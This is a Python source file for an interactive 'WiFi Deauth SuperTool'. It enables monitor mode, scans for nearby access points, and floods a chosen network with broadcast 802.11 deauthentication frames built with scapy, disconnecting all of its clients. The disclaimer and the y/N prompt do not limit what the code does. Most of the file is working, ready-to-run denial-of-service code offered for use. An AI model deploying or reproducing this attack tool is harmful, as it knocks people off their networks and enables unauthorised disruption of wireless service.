#!/usr/bin/env python3
"""
WiFi Deauth SuperTool - Unified WiFi Deauthentication Attack Framework
Author: Ruby Doss (@rubydoss)
Instagram: @mr__dawxz

A professional, all-in-one tool for WiFi penetration testing that guides users
through monitor mode setup, network scanning, and deauthentication attacks.

FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
"""

import argparse
import json
import logging
import os
import signal
import subprocess
import sys
import time
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from threading import Thread, Event

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
except ImportError as e:
    print(f"❌ Missing dependencies: {e}")
    print("Please install requirements: pip3 install -r requirements.txt")
    sys.exit(1)

# Global variables
current_interface = None
monitor_interface = None
scanning = False
attacking = False
attack_stats = {
    'packets_sent': 0,
    'start_time': None,
    'target_bssid': None,
    'target_ssid': None
}

def print_banner():
    """Display tool banner with author information"""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                    WiFi Deauth SuperTool                        ║
║              Unified WiFi Penetration Framework                  ║
╠══════════════════════════════════════════════════════════════════╣
║  Author: Ruby Doss (@rubydoss)                                  ║
║  Instagram: @mr__dawxz                                           ║
║  GitHub: https://github.com/rubydoss                            ║
╠══════════════════════════════════════════════════════════════════╣
║  ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️           ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}[!] Legal Notice: Only use on networks you own or have explicit permission to test.
[!] Unauthorized WiFi attacks are illegal and punishable by law.{Style.RESET_ALL}
"""
    print(banner)

def print_status(message, status_type="INFO"):
    """Print colored status messages"""
    colors = {
        "INFO": Fore.BLUE,
        "SUCCESS": Fore.GREEN, 
        "WARNING": Fore.YELLOW,
        "ERROR": Fore.RED
    }
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{colors.get(status_type, Fore.WHITE)}[{timestamp}] [{status_type}]{Style.RESET_ALL} {message}")

def check_root():
    """Check if running with root privileges"""
    if os.geteuid() != 0:
        print_status("This tool requires root privileges to access wireless interfaces", "ERROR")
        print_status("Please run with: sudo python3 wifi_deauth_supertool.py", "INFO")
        sys.exit(1)

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    global attacking, scanning
    print_status("\\nShutdown signal received...", "WARNING")
    attacking = False
    scanning = False
    cleanup_and_exit()

def cleanup_and_exit():
    """Restore interfaces and exit cleanly"""
    global monitor_interface, current_interface
    
    print_status("Cleaning up and restoring interfaces...", "INFO")
    
    if monitor_interface:
        try:
            # Restore original interface
            subprocess.run(['airmon-ng', 'stop', monitor_interface], 
                         capture_output=True, text=True)
            print_status(f"Restored interface: {current_interface}", "SUCCESS")
        except Exception as e:
            print_status(f"Error restoring interface: {e}", "ERROR")
    
    # Restart NetworkManager
    try:
        subprocess.run(['systemctl', 'start', 'NetworkManager'], 
                     capture_output=True, text=True)
        print_status("NetworkManager restarted", "SUCCESS")
    except Exception:
        pass
    
    print_status("Goodbye! 👋", "INFO")
    sys.exit(0)

def get_wireless_interfaces():
    """Get list of available wireless interfaces"""
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.STDOUT)
        interfaces = []
        
        for line in result.stdout.split('\\n'):
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        
        return interfaces
    except Exception as e:
        print_status(f"Error detecting wireless interfaces: {e}", "ERROR")
        return []

def select_interface():
    """Let user select wireless interface"""
    interfaces = get_wireless_interfaces()
    
    if not interfaces:
        print_status("No wireless interfaces found!", "ERROR")
        print_status("Make sure you have a WiFi adapter connected", "INFO")
        return None
    
    print(f"\\n{Fore.CYAN}📡 Available Wireless Interfaces:{Style.RESET_ALL}")
    print("-" * 40)
    
    for i, interface in enumerate(interfaces, 1):
        print(f"  {Fore.GREEN}[{i}]{Style.RESET_ALL} {interface}")
    
    while True:
        try:
            choice = input(f"\\n{Fore.YELLOW}Select interface (1-{len(interfaces)}): {Style.RESET_ALL}")
            choice = int(choice) - 1
            
            if 0 <= choice < len(interfaces):
                return interfaces[choice]
            else:
                print_status("Invalid choice! Please try again.", "ERROR")
        except ValueError:
            print_status("Please enter a valid number!", "ERROR")
        except KeyboardInterrupt:
            cleanup_and_exit()

def enable_monitor_mode(interface):
    """Enable monitor mode on selected interface"""
    global monitor_interface, current_interface
    
    current_interface = interface
    print_status(f"Enabling monitor mode on {interface}...", "INFO")
    
    try:
        # Stop NetworkManager to avoid conflicts
        subprocess.run(['systemctl', 'stop', 'NetworkManager'], 
                     capture_output=True, text=True)
        
        # Kill interfering processes
        subprocess.run(['airmon-ng', 'check', 'kill'], 
                     capture_output=True, text=True)
        
        # Enable monitor mode
        result = subprocess.run(['airmon-ng', 'start', interface], 
                              capture_output=True, text=True)
        
        # Find monitor interface name
        if 'monitor mode enabled' in result.stdout.lower():
            # Usually it's interfacemon (e.g., wlan0mon)
            monitor_interface = f"{interface}mon"
            
            # Verify the interface exists
            check_result = subprocess.run(['iwconfig', monitor_interface], 
                                        capture_output=True, text=True)
            
            if 'Mode:Monitor' in check_result.stdout:
                print_status(f"Monitor mode enabled successfully: {monitor_interface}", "SUCCESS")
                return monitor_interface
        
        print_status("Failed to enable monitor mode", "ERROR")
        return None
        
    except Exception as e:
        print_status(f"Error enabling monitor mode: {e}", "ERROR")
        return None

class NetworkScanner:
    """WiFi network scanner class"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.clients = defaultdict(list)
        self.scanning = False
    
    def packet_handler(self, packet):
        """Handle captured packets during scanning"""
        if not self.scanning:
            return
        
        try:
            if packet.haslayer(Dot11Beacon):
                self.process_beacon(packet)
        except Exception:
            pass
    
    def process_beacon(self, packet):
        """Process beacon frames to extract network info"""
        try:
            bssid = packet[Dot11].addr3
            
            # Extract SSID
            ssid = ""
            if packet.haslayer(Dot11Elt):
                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
            
            if not ssid:
                ssid = "<Hidden>"
            
            # Get channel
            channel = self.get_channel(packet)
            
            # Get encryption
            crypto = self.get_crypto_type(packet)
            
            # Get signal strength
            signal_strength = "N/A"
            if packet.haslayer(RadioTap) and hasattr(packet[RadioTap], 'dBm_AntSignal'):
                signal_strength = f"{packet[RadioTap].dBm_AntSignal} dBm"
            
            # Store network info
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'ssid': ssid,
                    'bssid': bssid,
                    'channel': channel,
                    'crypto': crypto,
                    'signal': signal_strength,
                    'beacons': 1
                }
            else:
                self.networks[bssid]['beacons'] += 1
                
        except Exception:
            pass
    
    def get_channel(self, packet):
        """Extract channel from beacon"""
        try:
            p = packet[Dot11Elt]
            while isinstance(p, Dot11Elt):
                if p.ID == 3:  # DS Parameter Set
                    return ord(p.info[:1])
                p = p.payload
            return "?"
        except:
            return "?"
    
    def get_crypto_type(self, packet):
        """Determine encryption type"""
        try:
            crypto = []
            
            # Check privacy bit
            if packet[Dot11].FCfield & 0x40:
                crypto.append("WEP")
            
            # Parse information elements
            p = packet[Dot11Elt]
            while isinstance(p, Dot11Elt):
                if p.ID == 48:  # RSN IE (WPA2/WPA3)
                    crypto.append("WPA2")
                elif p.ID == 221 and len(p.info) >= 4 and p.info[:4] == b'\\x00P\\xf2\\x01':
                    crypto.append("WPA")
                p = p.payload
            
            if not crypto:
                return "Open"
            return "/".join(crypto)
            
        except:
            return "Unknown"
    
    def scan_networks(self, duration=20):
        """Scan for networks for specified duration"""
        print_status(f"Scanning for WiFi networks on {self.interface}...", "INFO")
        print_status(f"Scanning for {duration} seconds - Please wait...", "INFO")
        
        self.scanning = True
        
        # Start packet capture in separate thread
        capture_thread = Thread(target=self._capture_packets, daemon=True)
        capture_thread.start()
        
        # Scan for specified duration with progress
        for i in range(duration):
            time.sleep(1)
            print(f"\\r{Fore.YELLOW}[SCANNING] {i+1}/{duration}s - Networks found: {len(self.networks)}{Style.RESET_ALL}", end="")
        
        print()  # New line
        self.scanning = False
        
        print_status(f"Scan complete! Found {len(self.networks)} networks", "SUCCESS")
        return self.networks
    
    def _capture_packets(self):
        """Capture packets in separate thread"""
        try:
            sniff(iface=self.interface, prn=self.packet_handler, 
                  stop_filter=lambda x: not self.scanning, timeout=1)
        except Exception as e:
            print_status(f"Capture error: {e}", "ERROR")

def display_networks(networks):
    """Display discovered networks in a nice table"""
    if not networks:
        print_status("No networks found!", "WARNING")
        return None
    
    print(f"\\n{Fore.CYAN}📡 Discovered WiFi Networks:{Style.RESET_ALL}")
    print("=" * 80)
    print(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'Ch':<4} {'Security':<12} {'Signal':<10}")
    print("=" * 80)
    
    network_list = list(networks.values())
    
    for i, network in enumerate(network_list, 1):
        ssid = network['ssid'][:24] if len(network['ssid']) > 24 else network['ssid']
        color = Fore.GREEN if network['crypto'] == "Open" else Fore.YELLOW
        
        print(f"{color}{i:<3} {ssid:<25} {network['bssid']:<18} {network['channel']:<4} "
              f"{network['crypto']:<12} {network['signal']:<10}{Style.RESET_ALL}")
    
    return network_list

def select_target_network(networks):
    """Let user select target network"""
    network_list = display_networks(networks)
    
    if not network_list:
        return None
    
    while True:
        try:
            choice = input(f"\\n{Fore.YELLOW}Select target network (1-{len(network_list)}) or 'q' to quit: {Style.RESET_ALL}")
            
            if choice.lower() == 'q':
                return None
            
            choice = int(choice) - 1
            
            if 0 <= choice < len(network_list):
                target = network_list[choice]
                print_status(f"Selected target: {target['ssid']} ({target['bssid']})", "INFO")
                return target
            else:
                print_status("Invalid choice! Please try again.", "ERROR")
                
        except ValueError:
            print_status("Please enter a valid number or 'q' to quit!", "ERROR")
        except KeyboardInterrupt:
            cleanup_and_exit()

def confirm_attack(target):
    """Get user confirmation for attack"""
    print(f"\\n{Fore.RED}⚠️  WARNING: You are about to attack WiFi network:{Style.RESET_ALL}")
    print(f"   SSID: {Fore.CYAN}{target['ssid']}{Style.RESET_ALL}")
    print(f"   BSSID: {Fore.CYAN}{target['bssid']}{Style.RESET_ALL}")
    print(f"   Security: {Fore.CYAN}{target['crypto']}{Style.RESET_ALL}")
    
    print(f"\\n{Fore.YELLOW}This will disconnect all clients from this network!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Only proceed if you have explicit permission to test this network.{Style.RESET_ALL}")
    
    while True:
        try:
            confirm = input(f"\\n{Fore.RED}Continue with deauth attack? [y/N]: {Style.RESET_ALL}").lower()
            
            if confirm in ['y', 'yes']:
                return True
            elif confirm in ['n', 'no', '']:
                return False
            else:
                print_status("Please enter 'y' for yes or 'n' for no", "ERROR")
                
        except KeyboardInterrupt:
            cleanup_and_exit()

def perform_deauth_attack(interface, target):
    """Perform continuous deauthentication attack"""
    global attacking, attack_stats
    
    attack_stats['start_time'] = time.time()
    attack_stats['target_bssid'] = target['bssid']
    attack_stats['target_ssid'] = target['ssid']
    attack_stats['packets_sent'] = 0
    attacking = True
    
    print_status(f"Starting deauthentication attack on {target['ssid']}", "INFO")
    print_status("Press Ctrl+C to stop the attack", "WARNING")
    
    try:
        while attacking:
            # Create deauth packet (broadcast to all clients)
            packet = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=target['bssid'],       # AP
                addr3=target['bssid']        # BSSID
            ) / Dot11Deauth(reason=7)
            
            # Send packet
            sendp(packet, iface=interface, verbose=False)
            attack_stats['packets_sent'] += 1
            
            # Display stats every 10 packets
            if attack_stats['packets_sent'] % 10 == 0:
                duration = time.time() - attack_stats['start_time']
                rate = attack_stats['packets_sent'] / duration if duration > 0 else 0
                
                print(f"\\r{Fore.GREEN}[ATTACKING] Packets: {attack_stats['packets_sent']} | "
                      f"Rate: {rate:.1f}/sec | Duration: {int(duration)}s{Style.RESET_ALL}", end="")
            
            time.sleep(0.1)  # 100ms delay between packets
            
    except KeyboardInterrupt:
        attacking = False
        print(f"\\n{Fore.YELLOW}Attack stopped by user{Style.RESET_ALL}")
    except Exception as e:
        attacking = False
        print_status(f"\\nAttack error: {e}", "ERROR")
    
    # Print final stats
    duration = time.time() - attack_stats['start_time']
    print(f"\\n\\n{Fore.CYAN}📊 Attack Summary:{Style.RESET_ALL}")
    print(f"   Target: {attack_stats['target_ssid']} ({attack_stats['target_bssid']})")
    print(f"   Packets sent: {attack_stats['packets_sent']}")
    print(f"   Duration: {int(duration)} seconds")
    print(f"   Average rate: {attack_stats['packets_sent']/duration:.1f} packets/sec")

def main_menu():
    """Main application loop"""
    global monitor_interface
    
    print_banner()
    
    # Check root privileges
    check_root()
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        while True:
            print(f"\\n{Fore.CYAN}🚀 WiFi Deauth SuperTool - Main Menu{Style.RESET_ALL}")
            print("=" * 40)
            print(f"  {Fore.GREEN}[1]{Style.RESET_ALL} Setup Monitor Mode & Scan Networks")
            print(f"  {Fore.GREEN}[2]{Style.RESET_ALL} Attack Selected Network") 
            print(f"  {Fore.GREEN}[3]{Style.RESET_ALL} Exit & Cleanup")
            
            choice = input(f"\\n{Fore.YELLOW}Choose option (1-3): {Style.RESET_ALL}")
            
            if choice == "1":
                # Interface selection and monitor mode
                interface = select_interface()
                if not interface:
                    continue
                
                monitor_interface = enable_monitor_mode(interface)
                if not monitor_interface:
                    print_status("Failed to enable monitor mode. Please try again.", "ERROR")
                    continue
                
                # Scan networks
                scanner = NetworkScanner(monitor_interface)
                networks = scanner.scan_networks(20)
                
                if networks:
                    target = select_target_network(networks)
                    if target and confirm_attack(target):
                        perform_deauth_attack(monitor_interface, target)
                
            elif choice == "2":
                if not monitor_interface:
                    print_status("Please setup monitor mode first (option 1)", "ERROR")
                    continue
                
                # Quick scan and attack
                scanner = NetworkScanner(monitor_interface)
                networks = scanner.scan_networks(15)
                
                if networks:
                    target = select_target_network(networks)
                    if target and confirm_attack(target):
                        perform_deauth_attack(monitor_interface, target)
            
            elif choice == "3":
                cleanup_and_exit()
            
            else:
                print_status("Invalid choice! Please select 1, 2, or 3.", "ERROR")
                
    except KeyboardInterrupt:
        cleanup_and_exit()
    except Exception as e:
        print_status(f"Unexpected error: {e}", "ERROR")
        cleanup_and_exit()

if __name__ == "__main__":
    main_menu()